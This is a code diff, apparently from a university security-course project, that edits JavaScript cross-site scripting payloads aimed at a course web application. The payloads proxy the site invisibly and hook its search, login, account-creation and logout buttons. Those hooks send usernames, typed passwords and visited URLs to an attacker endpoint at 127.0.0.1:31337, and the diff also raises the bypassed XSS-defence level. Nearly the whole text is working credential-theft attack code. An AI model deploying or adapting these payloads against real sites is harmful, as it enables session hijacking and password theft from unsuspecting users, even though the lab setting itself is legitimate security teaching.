@@ -14,19 +14,17 @@ function payload2(attacker){
 		$(`html`).load(href,function(){
 		$(`html`).show();
 			$(`a`).each(function(){
-			    if(this.href.indexOf(`sscriptcript`)!=-1||this.href.indexOf(`script`)!=-1){
-			        $(this).hide();}});
+			if(this.href.indexOf(`sscriptcript`)!=-1||this.href.indexOf(`script`)!=-1){$(this).hide();}});
 			var ad=`http://cis551.cis.upenn.edu/project3/`;
 			var ru=window.location.href;
 			history.replaceState(window.history.state,`/project3`,`/project3`);
 		    $(`#search-btn`).click(function(e){
 		      var q=$(`#query`).val().split(` `).join(`+`);
-			  $.get(ad+`search?q=`+q,
-			  function(e){document.write(e);});
+			  $.ajax({url:ad+`search?q=`+q}).done(function(e){document.write(e);
+			  	setTimeout(function(){;proxy(ad+`search?q=`+q,ru,1);},500);});
 			  e.preventDefault();
 			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search?q=`+q);
-  		      proxy(ad+`search?q=`+q,ru,1);
-	        }); 
+	        });
 	        $(`#search-again-btn`).click(function(e){
 		      e.preventDefault();
 			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search`);
@@ -37,22 +35,22 @@ function payload2(attacker){
 			  $.ajax({url:ad+`login?csrfdefense=0`,method:`POST`,data:{username:$(`#username`).val(),password:$(`#userpass`).val()},success:function(){
 			    window.location.replace(ru);;}});
 			  $.get(attacker+`stolen?event=login&user=`+$(`#username`).val()+`&pass=`+$(`#userpass`).val());
-	        }); 
+	        });
 		    $(`#new-account-btn`).click(function(e){
 		      e.preventDefault();
 			  $.ajax({url:ad+`create?csrfdefense=0`,method:`POST`,data:{username:$(`#username`).val(),password:$(`#userpass`).val()},success:function(){
 			    window.location.replace(ru);;}});
-	        }); 
+	        });
 		    $(`#log-out-btn`).click(function(e){
 		      e.preventDefault();
 			  $.get(attacker+`stolen?event=logout&user=`+$(`#logged-in-user`).text());
 			  $.ajax({url:ad+`logout?csrfdefense=0`,method:`POST`,success:function(){
-			  	if (stat==0){window.location.replace(ru);} else {window.location.replace(purl);}}});
+			  	if(stat==0){window.location.replace(ru);}else{window.location.replace(purl);}}});
 	        });
 			});
 		}
 	$(`html`).hide();
-	proxy(`./`, `./`, 0);
+	proxy(`./`,`./`,0);
 }
 /*
 			  $.post(ad+"login?csrfdefense=0", 
@@ -80,7 +78,7 @@ function payload(attacker){
 		      var q=$("#query").val().split(' ').join('+');
 			  e.preventDefault();
 			  $.ajax({url:ad+"search?q="+q}).done(function(e){document.write(e);
-			  	setTimeout(function(){console.log("hard");proxy(ad+"search?q="+q,ru,1);},500);});
+			  	setTimeout(function(){;proxy(ad+"search?q="+q,ru,1);},500);});
 			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search?q="+q);}); 
 	        $("#search-again-btn").click(function(e){
 		      e.preventDefault();
@@ -98,7 +96,6 @@ function payload(attacker){
 			    window.location.replace(ru);;}});
 			});
 		    $("#log-out-btn").click(function(e){
-		    	alert(stat+purl);
 		      e.preventDefault();
 			  $.ajax({url:ad+"logout?csrfdefense=0",method:"POST"}).done(function(){if(stat==0){window.location.replace(ru);}else{window.location.replace(purl);}});
 			  $.get(attacker+"stolen?event=logout&user="+$('#logged-in-user').text());
@@ -136,7 +133,7 @@ function makeLink(xssdefense, target, attacker) {
 		}
 	}
 
-	var xssdefense = 2;
+	var xssdefense = 3;
 	var target = "http://cis551.cis.upenn.edu/project3/";
 	var attacker = "http://127.0.0.1:31337/";
 
